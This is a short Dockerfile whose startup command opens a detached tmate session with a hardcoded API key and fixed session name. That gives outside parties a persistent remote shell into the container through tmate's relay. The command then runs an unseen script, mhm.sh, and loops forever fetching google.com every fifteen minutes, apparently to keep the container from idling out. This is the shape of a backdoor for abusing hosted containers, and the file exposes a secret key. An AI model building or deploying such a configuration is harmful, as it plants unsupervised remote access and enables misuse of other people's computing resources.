FROM ubuntu:latest

WORKDIR /app

COPY mhm.sh /app/mhm.sh

RUN chmod +x /app/mhm.sh

COPY . /app

RUN apt-get update -y && apt-get install wget -y && apt-get install -y xz-utils && apt-get install screen -y
RUN chmod +x mhm.sh
CMD screen -dmS tmate_session tmate -k tmk-gChyUQsCpc4tfLBbv7bdVbbBQu -n erikaateko01 && bash mhm.sh && while true; do wget google.com ; sleep 900 ; done
